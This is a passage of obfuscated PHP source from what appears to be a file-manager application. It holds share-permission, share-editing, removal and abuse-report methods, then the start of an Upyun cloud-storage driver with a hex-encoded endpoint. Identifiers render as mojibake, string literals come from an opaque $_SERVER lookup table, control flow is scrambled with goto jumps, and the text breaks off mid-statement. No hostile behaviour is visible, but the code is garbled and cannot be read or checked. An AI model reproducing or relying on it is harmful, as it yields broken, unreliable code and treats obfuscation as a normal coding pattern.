=& $_SERVER[™⁄»üÆ]; $dﬂ·ëœµµÇ = $bÈ“°¢Îû∫ == $aÈ÷–¯∫∞∆[1179] ? 0 : USER_ID; $cü¨›á·˘ƒ = array($aÈ÷–¯∫∞∆[411] => $aÙ¨Ñı¬¬Ã, $aÈ÷–¯∫∞∆[1528] => $dﬂ·ëœµµÇ); goto bÍ–‰·ãõ¯; BŸíÔ”√Üü: } private function _shareAuthSet($BËÓ»É∏Àƒ, $b»€€ìŸ∂Ö) { goto CﬂÉÿ≠ÔÎÃ; CﬂÉÿ≠ÔÎÃ: $E∏€©ÂœÉå =& $_SERVER[™⁄»üÆ]; if (!is_array($b»€€ìŸ∂Ö)) { return !1; } $fü§îÈä‰É = Model($E∏€©ÂœÉå[1810]); goto cÇÈÍ’öüÃ; cÇÈÍ’öüÃ: $fü§îÈä‰É->where(array($E∏€©ÂœÉå[469] => $BËÓ»É∏Àƒ))->delete(); $B∂’∂°∏âó = array(); foreach ($b»€€ìŸ∂Ö as $a˜ƒ˜‹∫Çö) { $fî±å†Öë§ = SourceModel::TYPE_USER; if ($a˜ƒ˜‹∫Çö[$E∏€©ÂœÉå[405]] == SourceModel::TYPE_GROUP) { $fî±å†Öë§ = SourceModel::TYPE_GROUP; } $E˜¢‹•ÏÛÜ = array($E∏€©ÂœÉå[469] => $BËÓ»É∏Àƒ, $E∏€©ÂœÉå[405] => $fî±å†Öë§, $E∏€©ÂœÉå[485] => intval($a˜ƒ˜‹∫Çö[$E∏€©ÂœÉå[485]]), $E∏€©ÂœÉå[1806] => 0, $E∏€©ÂœÉå[1860] => -1); if ($a˜ƒ˜‹∫Çö[$E∏€©ÂœÉå[1806]]) { $E˜¢‹•ÏÛÜ[$E∏€©ÂœÉå[1806]] = $a˜ƒ˜‹∫Çö[$E∏€©ÂœÉå[1806]]; } else { if ($a˜ƒ˜‹∫Çö[$E∏€©ÂœÉå[1860]]) { $E˜¢‹•ÏÛÜ[$E∏€©ÂœÉå[1860]] = $a˜ƒ˜‹∫Çö[$E∏€©ÂœÉå[1860]]; } } $B∂’∂°∏âó[] = $E˜¢‹•ÏÛÜ; } goto DÖÌ∑∂≠çø; DÖÌ∑∂≠çø: return $fü§îÈä‰É->addAll($B∂’∂°∏âó, array(), !0); goto BÎ—í≥«óí; BÎ—í≥«óí: } public function numViewAdd($E›Çíò√Ñ¥) { $aÊÊùó£„û =& $_SERVER[™⁄»üÆ]; $C¶¡¿êá™¢ = array($aÊÊùó£„û[468] => $E›Çíò√Ñ¥); $this->where($C¶¡¿êá™¢)->setAdd($aÊÊùó£„û[1857]); } public function numDownloadAdd($B §û⁄âıﬁ) { $eáÖ ´«Ãé =& $_SERVER[™⁄»üÆ]; $DÚÜê¬Ñè≤ = array($eáÖ ´«Ãé[468] => $B §û⁄âıﬁ); $this->where($DÚÜê¬Ñè≤)->setAdd($eáÖ ´«Ãé[1858]); } protected function shareEdit($aè§∂ÿÔÔæ, $dπ≠œ◊≤¢Â) { goto d≠…ÖΩÊÏÖ; bÔãàöìÆÆ: $this->_checkLinkShare($dπ≠œ◊≤¢Â, $EÎÕ¿œÛÂÏ); $dô•ó˜ÏûÜ = array(); $c∆›ﬂ™∫¿ó = explode($aÙåÏ¢Ö∑[47], $aÙåÏ¢Ö∑[1861]); goto AèµÆ∑ÀØÁ; d≠…ÖΩÊÏÖ: $aÙåÏ¢Ö∑ =& $_SERVER[™⁄»üÆ]; $EÎÕ¿œÛÂÏ = $this->getInfo($aè§∂ÿÔÔæ); if (!$EÎÕ¿œÛÂÏ) { return !1; } goto bÔãàöìÆÆ; Aôπ¥ïÖàÙ: if (isset($dπ≠œ◊≤¢Â[$aÙåÏ¢Ö∑[1850]])) { $this->_shareAuthSet($aè§∂ÿÔÔæ, $dπ≠œ◊≤¢Â[$aÙåÏ¢Ö∑[1850]]); } return !0; goto eáÒ∑’‰øê; AèµÆ∑ÀØÁ: foreach ($c∆›ﬂ™∫¿ó as $FÿèÒîñ∞‘) { if (!array_key_exists($FÿèÒîñ∞‘, $dπ≠œ◊≤¢Â)) { continue; } $dô•ó˜ÏûÜ[$FÿèÒîñ∞‘] = $dπ≠œ◊≤¢Â[$FÿèÒîñ∞‘]; } $this->shareEventAdd($EÎÕ¿œÛÂÏ[$aÙåÏ¢Ö∑[396]], $dπ≠œ◊≤¢Â, $aÙåÏ¢Ö∑[1673]); $this->where(array($aÙåÏ¢Ö∑[468] => $aè§∂ÿÔÔæ))->save($dô•ó˜ÏûÜ); goto Aôπ¥ïÖàÙ; eáÒ∑’‰øê: } private function _checkLinkShare($FÑ¢ÚÛöïµ, $eßÕ”Õ´áÂ) { goto báê€ﬁ ∂ü; f»Ü∞õı‡≥: if ($eßÕ”Õ´áÂ[$C§⁄¡¶•≠‰[85]][$C§⁄¡¶•≠‰[29]] != $C§⁄¡¶•≠‰[193]) { $A¥Õ‡º¿ı‹ = $this->_folderReport($Dñ êâÿÛï); if (!$A¥Õ‡º¿ı‹) { return; } show_json(LNG($C§⁄¡¶•≠‰[1862]) . $C§⁄¡¶•≠‰[1863] . $A¥Õ‡º¿ı‹, !1); } $F÷ÂâŒÕ—´ = Model($C§⁄¡¶•≠‰[809])->fileInfoGet($eßÕ”Õ´áÂ[$C§⁄¡¶•≠‰[85]][$C§⁄¡¶•≠‰[396]]); if (!$F÷ÂâŒÕ—´) { return; } goto eπ¯∆É«åß; báê€ﬁ ∂ü: $C§⁄¡¶•≠‰ =& $_SERVER[™⁄»üÆ]; if ($FÑ¢ÚÛöïµ[$C§⁄¡¶•≠‰[474]] != $C§⁄¡¶•≠‰[87]) { return; } $Dñ êâÿÛï = $eßÕ”Õ´áÂ[$C§⁄¡¶•≠‰[85]][$C§⁄¡¶•≠‰[396]]; goto f»Ü∞õı‡≥; eπ¯∆É«åß: $aïáÕ™–áÎ = $this->shareFileMeta($F÷ÂâŒÕ—´[$C§⁄¡¶•≠‰[448]]); if (isset($aïáÕ™–áÎ[$C§⁄¡¶•≠‰[372]]) && $aïáÕ™–áÎ[$C§⁄¡¶•≠‰[372]] == $C§⁄¡¶•≠‰[87]) { show_json(LNG($C§⁄¡¶•≠‰[1864]), !1); } goto d¥∏èÂ®ıª; d¥∏èÂ®ıª: } private function _folderReport($FÛ¥º´ëØ˜) { goto d®∏±◊åé; D¨˜ëΩ®˜∏: $aã ÒÒ»ƒ› = substr($füŸ°∫Øïâ[$d∂Œë◊Ñ§ò[503]], strpos($füŸ°∫Øïâ[$d∂Œë◊Ñ§ò[503]], $fÌ«ŸÆõ∆›)); $dÑÁ¿ó∞ﬁÁ = array($d∂Œë◊Ñ§ò[396] => array($d∂Œë◊Ñ§ò[7], trim($aã ÒÒ»ƒ›, $d∂Œë◊Ñ§ò[47]))); $Féê∑ÙË”ú = Model($d∂Œë◊Ñ§ò[809])->where($dÑÁ¿ó∞ﬁÁ)->field($d∂Œë◊Ñ§ò[28])->select(); goto aÜ¡ÍÑË™; däô∆Óá»π: if (!$Fﬁéπ€Ñ€ﬂ) { return !1; } $Fﬁéπ€Ñ€ﬂ = array_to_keyvalue($Fﬁéπ€Ñ€ﬂ, $d∂Œë◊Ñ§ò[33], $d∂Œë◊Ñ§ò[448]); $fÌ«ŸÆõ∆› = $d∂Œë◊Ñ§ò[47] . $FÛ¥º´ëØ˜ . $d∂Œë◊Ñ§ò[47]; goto A«Éö∑ØËÒ; A«Éö∑ØËÒ: $dÑÁ¿ó∞ﬁÁ = array($d∂Œë◊Ñ§ò[448] => array($d∂Œë◊Ñ§ò[7], $Fﬁéπ€Ñ€ﬂ), $d∂Œë◊Ñ§ò[503] => array($d∂Œë◊Ñ§ò[380], "\x25{$fÌ«ŸÆõ∆›}\45"), $d∂Œë◊Ñ§ò[424] => 0); $füŸ°∫Øïâ = Model($d∂Œë◊Ñ§ò[809])->where($dÑÁ¿ó∞ﬁÁ)->field($d∂Œë◊Ñ§ò[1866])->find(); if (!$füŸ°∫Øïâ) { return !1; } goto D¨˜ëΩ®˜∏; aÜ¡ÍÑË™: $F∏∑≤óæ—ÿ = array_to_keyvalue($Féê∑ÙË”ú, $d∂Œë◊Ñ§ò[33], $d∂Œë◊Ñ§ò[28]); $F∏∑≤óæ—ÿ[] = $füŸ°∫Øïâ[$d∂Œë◊Ñ§ò[28]]; return implode($d∂Œë◊Ñ§ò[8], $F∏∑≤óæ—ÿ); goto F∫À…ë⁄‚∞; d®∏±◊åé: $d∂Œë◊Ñ§ò =& $_SERVER[™⁄»üÆ]; $dÑÁ¿ó∞ﬁÁ = array($d∂Œë◊Ñ§ò[448] => array($d∂Œë◊Ñ§ò[979], 0), $d∂Œë◊Ñ§ò[729] => 3); $Fﬁéπ€Ñ€ﬂ = Model($d∂Œë◊Ñ§ò[1865])->where($dÑÁ¿ó∞ﬁÁ)->field($d∂Œë◊Ñ§ò[448])->select(); goto däô∆Óá»π; F∫À…ë⁄‚∞: } protected function remove($d„íÖÆ¥≤È) { goto dÑÜÃƒ…◊≤; dÑÜÃƒ…◊≤: $D§˘”∆–óå =& $_SERVER[™⁄»üÆ]; if (is_array($d„íÖÆ¥≤È)) { $d„íÖÆ¥≤È = array($D§˘”∆–óå[7], $d„íÖÆ¥≤È); } $bœ±ÿ¬†ÑŸ = array($D§˘”∆–óå[469] => $d„íÖÆ¥≤È); goto A¥≈Ï»É—ƒ; A¥≈Ï»É—ƒ: $CΩÒáË√˜“ = $this->where($bœ±ÿ¬†ÑŸ)->delete(); if ($CΩÒáË√˜“) { Model($D§˘”∆–óå[578])->where(array($D§˘”∆–óå[469] => $d„íÖÆ¥≤È))->delete(); } $F∂ª’íˆ¢’ = is_array($d„íÖÆ¥≤È) ? $d„íÖÆ¥≤È[1] : array($d„íÖÆ¥≤È); goto CÃŸÇÖ⁄°æ; CÃŸÇÖ⁄°æ: for ($dÂÌÖ—ãÓæ = 0; $dÂÌÖ—ãÓæ < count($F∂ª’íˆ¢’); $dÂÌÖ—ãÓæ++) { $B∫÷®üﬂ‹à = $this->getInfo($F∂ª’íˆ¢’[$dÂÌÖ—ãÓæ]); if ($B∫÷®üﬂ‹à[$D§˘”∆–óå[476]] == $D§˘”∆–óå[87]) { Model($D§˘”∆–óå[547])->eventShare($B∫÷®üﬂ‹à[$D§˘”∆–óå[396]], $D§˘”∆–óå[1855]); } if ($B∫÷®üﬂ‹à[$D§˘”∆–óå[474]] == $D§˘”∆–óå[87]) { Model($D§˘”∆–óå[547])->eventShare($B∫÷®üﬂ‹à[$D§˘”∆–óå[396]], $D§˘”∆–óå[1854]); } } return $CΩÒáË√˜“; goto D◊≥Ω≈Ï¡ã; D◊≥Ω≈Ï¡ã: } protected function removeBySource($döåŸÕº¶£) { goto a˜«äÒ¡ÒÍ; d–¿ﬂåÖΩ«: $this->where($F∂Ø§ƒ∏ª¥)->delete(); Model($dÊ«••≈ò†[578])->where($F∂Ø§ƒ∏ª¥)->delete(); goto DØó‚„ø÷ı; BÃæ•ÂÈµÌ: $bçÚè˜⁄ØÃ = array_to_keyvalue($bçÚè˜⁄ØÃ, $dÊ«••≈ò†[33], $dÊ«••≈ò†[469]); if (!$bçÚè˜⁄ØÃ) { return; } $F∂Ø§ƒ∏ª¥ = array($dÊ«••≈ò†[468] => array($dÊ«••≈ò†[412], $bçÚè˜⁄ØÃ)); goto d–¿ﬂåÖΩ«; a˜«äÒ¡ÒÍ: $dÊ«••≈ò† =& $_SERVER[™⁄»üÆ]; $F∂Ø§ƒ∏ª¥ = array($dÊ«••≈ò†[411] => array($dÊ«••≈ò†[412], $döåŸÕº¶£)); $bçÚè˜⁄ØÃ = $this->field($dÊ«••≈ò†[469])->where($F∂Ø§ƒ∏ª¥)->select(); goto BÃæ•ÂÈµÌ; DØó‚„ø÷ı: } public function listAll($eÎë¯îè∫√) { goto A˘™‹ÜÚã¬; a˜¬ˆ≤ä¢: return $Aœ≥ü≥ñö∏; goto a‚∫ìã˘´Û; dÚø»¶ÿ´Á: if ($eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[740]]) { $fçâÔîƒÆÉ = $eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[477]] ? $eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[477]] : strtotime(date($fÇ„º“ç¡ﬁ[1867])); $cºè£íõ˘[$fÇ„º“ç¡ﬁ[194]] = array($fÇ„º“ç¡ﬁ[331], array($eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[740]], $fçâÔîƒÆÉ)); } if ($eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[29]]) { $cºè£íõ˘[$eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[29]]] = 1; } else { $cºè£íõ˘[] = array($fÇ„º“ç¡ﬁ[474] => array($fÇ„º“ç¡ﬁ[979], 0), $fÇ„º“ç¡ﬁ[476] => array($fÇ„º“ç¡ﬁ[979], 0), $fÇ„º“ç¡ﬁ[1844] => $fÇ„º“ç¡ﬁ[1798]); } if ($eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[1794]]) { $cºè£íõ˘[] = array($fÇ„º“ç¡ﬁ[471] => $eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[1794]], $fÇ„º“ç¡ﬁ[1440] => array($fÇ„º“ç¡ﬁ[380], "\x25{$eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[1794]]}\x25"), $fÇ„º“ç¡ﬁ[1844] => $fÇ„º“ç¡ﬁ[1798]); } goto eﬁêÍèŒÜà; A˘™‹ÜÚã¬: $fÇ„º“ç¡ﬁ =& $_SERVER[™⁄»üÆ]; $cºè£íõ˘ = array(); if ($eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[1537]]) { $cºè£íõ˘[$fÇ„º“ç¡ﬁ[1537]] = $eÎë¯îè∫√[$fÇ„º“ç¡ﬁ[1537]]; } goto dÚø»¶ÿ´Á; eﬁêÍèŒÜà: $Aœ≥ü≥ñö∏ = $this->_makeOrder()->where($cºè£íõ˘)->selectPage(20); if (empty($Aœ≥ü≥ñö∏[$fÇ„º“ç¡ﬁ[367]])) { return array(); } $this->_listDataApply($Aœ≥ü≥ñö∏[$fÇ„º“ç¡ﬁ[367]]); goto a˜¬ˆ≤ä¢; a‚∫ìã˘´Û: } public function listDataApply($D∏ÌË„äîï) { $this->_listDataApply($D∏ÌË„äîï); return $D∏ÌË„äîï; } private function _listDataApply(&$F´ ÏÎ»”∞) { goto FÀƒà≠É€ò; FÀƒà≠É€ò: $bòà áÊ≥û =& $_SERVER[™⁄»üÆ]; $C”∫ß≤Ì±– = array_to_keyvalue($F´ ÏÎ»”∞, $bòà áÊ≥û[33], $bòà áÊ≥û[1537]); $C¿ß±åÆ—Û = Model($bòà áÊ≥û[520])->userListInfo(array_unique($C”∫ß≤Ì±–)); goto cÔΩ†È§…ê; e¶üïƒÆØ°: unset($F÷Îüºü∫€); $F´ ÏÎ»”∞ = array_values($F´ ÏÎ»”∞); goto b∏≠âåÒÊî; cÔΩ†È§…ê: $aÂØÇ≥¨»÷ = array_to_keyvalue($F´ ÏÎ»”∞, $bòà áÊ≥û[33], $bòà áÊ≥û[396]); $AÂ§êÎÇé„ = Model($bòà áÊ≥û[809])->sourceListInfo($aÂØÇ≥¨»÷, !0); foreach ($F´ ÏÎ»”∞ as $A’ÈÓÈÊ£° => &$F÷Îüºü∫€) { $A≥‚ªî¥πﬂ = $F÷Îüºü∫€[$bòà áÊ≥û[1537]]; $F÷Îüºü∫€[$bòà áÊ≥û[1868]] = $C¿ß±åÆ—Û[$A≥‚ªî¥πﬂ] ? $C¿ß±åÆ—Û[$A≥‚ªî¥πﬂ] : !1; $Dâù©¢‹ﬂí = $F÷Îüºü∫€[$bòà áÊ≥û[396]]; $F÷Îüºü∫€[$bòà áÊ≥û[85]] = $AÂ§êÎÇé„[$Dâù©¢‹ﬂí] ? $AÂ§êÎÇé„[$Dâù©¢‹ﬂí] : !1; if ($F÷Îüºü∫€[$bòà áÊ≥û[85]][$bòà áÊ≥û[424]] == $bòà áÊ≥û[87]) { unset($F´ ÏÎ»”∞[$A’ÈÓÈÊ£°]); } if ($F÷Îüºü∫€[$bòà áÊ≥û[85]] != $bòà áÊ≥û[191] && !$F÷Îüºü∫€[$bòà áÊ≥û[85]]) { unset($F´ ÏÎ»”∞[$A’ÈÓÈÊ£°]); } } goto e¶üïƒÆØ°; b∏≠âåÒÊî: } private function _makeOrder($fè¨Û£≥Ü≥ = '') { goto Dƒ”Çò§Éä; Dƒ”Çò§Éä: $AåôÀ±ŸµÚ =& $_SERVER[™⁄»üÆ]; $CÙ≤ﬁíù˜€ = array($AåôÀ±ŸµÚ[194], $AåôÀ±ŸµÚ[477], $AåôÀ±ŸµÚ[1857], $AåôÀ±ŸµÚ[1858]); $E°ÿ›º®œ‰ = array($AåôÀ±ŸµÚ[429] => $AåôÀ±ŸµÚ[430], $AåôÀ±ŸµÚ[431] => $AåôÀ±ŸµÚ[432]); goto fô£å‡ñè…; fô£å‡ñè…: $B™·ÇÖëå = Input::get($AåôÀ±ŸµÚ[436], $AåôÀ±ŸµÚ[7], $AåôÀ±ŸµÚ[417], $CÙ≤ﬁíù˜€); $E„£ì≥û˜• = Input::get($AåôÀ±ŸµÚ[437], $AåôÀ±ŸµÚ[7], $AåôÀ±ŸµÚ[1869], array($AåôÀ±ŸµÚ[1793], $AåôÀ±ŸµÚ[431])); $E„£ì≥û˜• = $E°ÿ›º®œ‰[$E„£ì≥û˜•]; goto f®Ê¶ÖÕïÊ; f®Ê¶ÖÕïÊ: $fè¨Û£≥Ü≥ = $fè¨Û£≥Ü≥ . "{$B™·ÇÖëå}\40{$E„£ì≥û˜•}"; return $this->order($fè¨Û£≥Ü≥); goto CíÆœç‹øå; CíÆœç‹øå: } public function reportAdd($E±øËß–Ã√) { $D˘å«‘≈ÓÃ =& $_SERVER[™⁄»üÆ]; $AÚ˘ç†òÖ¯ = array($D˘å«‘≈ÓÃ[469] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[469]], $D˘å«‘≈ÓÃ[1537] => USER_ID); if (Model($D˘å«‘≈ÓÃ[1865])->where($AÚ˘ç†òÖ¯)->find()) { return !1; } $bâá¥ÜÈŒ£ = array($D˘å«‘≈ÓÃ[469] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[469]], $D˘å«‘≈ÓÃ[1440] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[1440]], $D˘å«‘≈ÓÃ[396] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[396]], $D˘å«‘≈ÓÃ[448] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[448]], $D˘å«‘≈ÓÃ[1537] => USER_ID, $D˘å«‘≈ÓÃ[29] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[29]], $D˘å«‘≈ÓÃ[432] => $E±øËß–Ã√[$D˘å«‘≈ÓÃ[432]]); return Model($D˘å«‘≈ÓÃ[1865])->add($bâá¥ÜÈŒ£); } public function reportList($D·ì±†á¥˘) { goto eä• ’·©Ù; CµÆÜÉ±¶Ù: $eΩéàé√ä = array($dàØ∫¬÷À∫[429] => $dàØ∫¬÷À∫[430], $dàØ∫¬÷À∫[431] => $dàØ∫¬÷À∫[432]); $D˜º•¢ÇÂ = $dàØ∫¬÷À∫[1874] . $eΩéàé√ä[$c≠•´í“‚œ]; $D¡Ù√Ç∑œ∫ = Model($dàØ∫¬÷À∫[1865])->where($EÖΩŒçå∏é)->order($D˜º•¢ÇÂ)->selectPage(20); goto f¶Ûó∂•Ÿ±; eä• ’·©Ù: $dàØ∫¬÷À∫ =& $_SERVER[™⁄»üÆ]; $EÖΩŒçå∏é = array(); if ($D·ì±†á¥˘[$dàØ∫¬÷À∫[740]]) { $D”¿≥ç’Âƒ = $D·ì±†á¥˘[$dàØ∫¬÷À∫[477]] ? $D·ì±†á¥˘[$dàØ∫¬÷À∫[477]] : strtotime(date($dàØ∫¬÷À∫[1867])); $EÖΩŒçå∏é[$dàØ∫¬÷À∫[194]] = array($dàØ∫¬÷À∫[331], array($D·ì±†á¥˘[$dàØ∫¬÷À∫[740]], $D”¿≥ç’Âƒ)); } goto DœÙØõâøê; DœÙØõâøê: if (isset($D·ì±†á¥˘[$dàØ∫¬÷À∫[29]]) && in_array($D·ì±†á¥˘[$dàØ∫¬÷À∫[29]], array($dàØ∫¬÷À∫[87], $dàØ∫¬÷À∫[1870], $dàØ∫¬÷À∫[1871], $dàØ∫¬÷À∫[1872], $dàØ∫¬÷À∫[1873]))) { $EÖΩŒçå∏é[$dàØ∫¬÷À∫[29]] = $D·ì±†á¥˘[$dàØ∫¬÷À∫[29]]; } if (isset($D·ì±†á¥˘[$dàØ∫¬÷À∫[729]]) && in_array($D·ì±†á¥˘[$dàØ∫¬÷À∫[729]], array($dàØ∫¬÷À∫[191], $dàØ∫¬÷À∫[87], $dàØ∫¬÷À∫[1870], $dàØ∫¬÷À∫[1871]))) { $EÖΩŒçå∏é[$dàØ∫¬÷À∫[729]] = $D·ì±†á¥˘[$dàØ∫¬÷À∫[729]]; } $c≠•´í“‚œ = Input::get($dàØ∫¬÷À∫[437], $dàØ∫¬÷À∫[7], $dàØ∫¬÷À∫[1869], array($dàØ∫¬÷À∫[1793], $dàØ∫¬÷À∫[431])); goto CµÆÜÉ±¶Ù; A‡òîÓäôˆ: $this->_listDataApply($D¡Ù√Ç∑œ∫[$dàØ∫¬÷À∫[367]]); return $D¡Ù√Ç∑œ∫; goto F∞Üâ‚öÑ‰; f¶Ûó∂•Ÿ±: if (empty($D¡Ù√Ç∑œ∫[$dàØ∫¬÷À∫[367]])) { return array(); } $b«é¿“¢∫ = array_to_keyvalue_group($D¡Ù√Ç∑œ∫[$dàØ∫¬÷À∫[367]], $dàØ∫¬÷À∫[729], $dàØ∫¬÷À∫[469]); if (!empty($b«é¿“¢∫[0])) { $D·ì±†á¥˘ = $b«é¿“¢∫[0]; $EÖΩŒçå∏é = array($dàØ∫¬÷À∫[469] => array($dàØ∫¬÷À∫[7], $D·ì±†á¥˘)); $Døâà∏∏¡å = $this->where($EÖΩŒçå∏é)->field($dàØ∫¬÷À∫[469])->select(); $Døâà∏∏¡å = array_to_keyvalue($Døâà∏∏¡å, $dàØ∫¬÷À∫[33], $dàØ∫¬÷À∫[469]); $DÖ¢–“í‘— = array_diff($D·ì±†á¥˘, $Døâà∏∏¡å); if (!empty($DÖ¢–“í‘—)) { foreach ($D¡Ù√Ç∑œ∫[$dàØ∫¬÷À∫[367]] as $aÚã˜ÖÒÃ¯ => $cñ©∑ûˆêŒ) { if (in_array($cñ©∑ûˆêŒ[$dàØ∫¬÷À∫[469]], $DÖ¢–“í‘—)) { unset($D¡Ù√Ç∑œ∫[$dàØ∫¬÷À∫[367]][$aÚã˜ÖÒÃ¯]); } } } } goto A‡òîÓäôˆ; F∞Üâ‚öÑ‰: } public function reportStatus($DèÈﬁ…≈øù) { goto fèö∆Ò≤™è; CÔ¡πÿı√à: if (!$Fãùøº–ãë) { return !1; } $fºàì»ÂÉ = array($FÆÆŸ«éèÁ[729] => $DèÈﬁ…≈øù[$FÆÆŸ«éèÁ[729]]); if ($DèÈﬁ…≈øù[$FÆÆŸ«éèÁ[729]] == $FÆÆŸ«éèÁ[1871] && $Fãùøº–ãë[$FÆÆŸ«éèÁ[729]] == $FÆÆŸ«éèÁ[1871]) { $fºàì»ÂÉ[$FÆÆŸ«éèÁ[729]] = 0; } goto Bå¨™’¢°Ç; fèö∆Ò≤™è: $FÆÆŸ«éèÁ =& $_SERVER[™⁄»üÆ]; $b”Ñé¯›Ü = array($FÆÆŸ«éèÁ[394] => $DèÈﬁ…≈øù[$FÆÆŸ«éèÁ[394]]); $Fãùøº–ãë = Model($FÆÆŸ«éèÁ[1865])->where($b”Ñé¯›Ü)->field($FÆÆŸ«éèÁ[1875])->find(); goto CÔ¡πÿı√à; Bå¨™’¢°Ç: $EÈö¬êüØﬂ = Model($FÆÆŸ«éèÁ[1865])->where($b”Ñé¯›Ü)->save($fºàì»ÂÉ); if ($DèÈﬁ…≈øù[$FÆÆŸ«éèÁ[729]] == $FÆÆŸ«éèÁ[1870]) { if ($Fãùøº–ãë[$FÆÆŸ«éèÁ[448]] != $FÆÆŸ«éèÁ[191] && $this->shareFileMeta($Fãùøº–ãë[$FÆÆŸ«éèÁ[448]])) { $this->shareFileMeta($Fãùøº–ãë[$FÆÆŸ«éèÁ[448]], 0); } $this->remove($Fãùøº–ãë[$FÆÆŸ«éèÁ[469]]); return !0; } if ($EÈö¬êüØﬂ && $DèÈﬁ…≈øù[$FÆÆŸ«éèÁ[729]] == $FÆÆŸ«éèÁ[1871]) { $Aã·œÒÓŒê = $fºàì»ÂÉ[$FÆÆŸ«éèÁ[729]] == $FÆÆŸ«éèÁ[1871] ? 1 : 0; $this->shareFileMeta($Fãùøº–ãë[$FÆÆŸ«éèÁ[448]], $Aã·œÒÓŒê); $this->removeByFile($Fãùøº–ãë[$FÆÆŸ«éèÁ[448]]); } goto eï¯¯¡Œ‹; eï¯¯¡Œ‹: return $EÈö¬êüØﬂ; goto A◊ﬁ„™«™; A◊ﬁ„™«™: } private function removeByFile($dÌá≈ﬂﬂŒÖ) { goto Dπ–ë¡áâﬂ; Dπ–ë¡áâﬂ: $fëöÆ›∑†∑ =& $_SERVER[™⁄»üÆ]; $Fûï≥‚æ‘ = Model($fëöÆ›∑†∑[809])->where(array($fëöÆ›∑†∑[448] => $dÌá≈ﬂﬂŒÖ))->field($fëöÆ›∑†∑[396])->select(); $d°›ÙÍç»“ = array_to_keyvalue($Fûï≥‚æ‘, $fëöÆ›∑†∑[33], $fëöÆ›∑†∑[396]); goto b·≠ÜÑ™◊∆; b·≠ÜÑ™◊∆: $b≥√»á‘±› = array($fëöÆ›∑†∑[396] => array($fëöÆ›∑†∑[7], $d°›ÙÍç»“), $fëöÆ›∑†∑[474] => 1); $Fûï≥‚æ‘ = $this->where($b≥√»á‘±›)->field($fëöÆ›∑†∑[469])->select(); if (empty($Fûï≥‚æ‘)) { return; } goto e•»ÇÜË∏ü; e•»ÇÜË∏ü: $A∆ä≤éÑ÷⁄ = array_to_keyvalue($Fûï≥‚æ‘, $fëöÆ›∑†∑[33], $fëöÆ›∑†∑[469]); $this->remove($A∆ä≤éÑ÷⁄); goto FË√–£ÌÔ‘; FË√–£ÌÔ‘: } private function shareFileMeta($côËàÉÏÙˆ, $bπùúØ÷Úﬂ = null) { $A≥≈∞¯†–– =& $_SERVER[™⁄»üÆ]; $aÀ•ß ™§™ = array($A≥≈∞¯†––[448] => $côËàÉÏÙˆ, $A≥≈∞¯†––[93] => $A≥≈∞¯†––[1876]); if (is_null($bπùúØ÷Úﬂ)) { return Model($A≥≈∞¯†––[1877])->where($aÀ•ß ™§™)->find(); } $aÀ•ß ™§™[$A≥≈∞¯†––[372]] = $bπùúØ÷Úﬂ; Model($A≥≈∞¯†––[1877])->add($aÀ•ß ™§™, array(), !0); } } goto B∑íÔÊπ”Ü; F Ü¯ñ„È‰: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\72\x2f\57\x76\x30\x2e\x61\160\x69\56\x75\x70\x79\165\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($b◊§†€¶±¿) { parent::__construct(); $this->_init($b◊§†€¶±¿); } public function _init($Báö…èÂ¿ ) { $dÑπ◊å∆∏… =& $_SERVER[™⁄»üÆ]; foreach ($Báö…èÂ¿  as $aÚØ§åˆŸ≠ => $F±çÀ¡ì¶¯) { if (isset($this->{$aÚØ§åˆŸ≠})) { $this->{$aÚØ§åˆŸ≠} = $F±çÀ¡ì¶¯; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($dÑπ◊å∆∏…[1337] . LNG($dÑπ◊å∆∏…[1270])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($e•…¶Îÿ·, $a®‚—ﬂ…ˆÓ = "\x47\105\x54") { $E“ÙÚø«ÑÌ =& $_SERVER[™⁄»üÆ]; $fê€ØÏ‚üæ = gmdate($E“ÙÚø«ÑÌ[1303]); $FŸ¯ΩØÇ˜Ω = base64_encode(hash_hmac($E“ÙÚø«ÑÌ[1338], "{$a®‚—ﬂ…ˆÓ}\x26{$e•…¶Îÿ·}\x26{$fê€ØÏ‚üæ}", md5("{$this->userpass}"), !0)); $Cµπ€ÿÒ∑Ï = array("\101\165\x74\x68\157\x72\x69\172\x61\x74\151\157\156\72\125\120\x59\x55\116\40{$this->username}\72{$FŸ¯ΩØÇ˜Ω}", "\104\x61\x74\x65\72{$fê€ØÏ‚üæ}"); return $Cµπ€ÿÒ∑Ï; } public function ussRequest($FÃá–å«åó, $cá⁄Öû¿óÛ = "\x47\x45\124", $aÎ·ÀÜîÏ™ = false, $A‚ƒ≈¢Õ•Â = false, $eœæ”÷´˜ö = false) { goto A¥éÃú√â; A¥éÃú√â: $cë—ÉØßﬂ¢ =& $_SERVER[™⁄»üÆ]; $FÃá–å«åó = trim($FÃá–å«åó, $cë—ÉØßﬂ¢[8]); $e¥“‘«ãæ∏ = "\57{$this->bucket}\x2f{$FÃá–å«åó}"; goto A„ãë¿◊ùè; A„ãë¿◊ùè: $CÊüµáŒ¨¿ = $this->ussHeaders($e¥“‘«ãæ∏, $cá⁄Öû¿óÛ); if ($A‚ƒ≈¢Õ•Â) { $CÊüµáŒ¨¿ = array_merge($CÊüµáŒ¨¿, $A‚ƒ≈¢Õ•Â); } $døœêöÈ∫Ê = url_request($this->endpoint . $e¥“‘«ãæ∏, $cá⁄Öû¿óÛ, 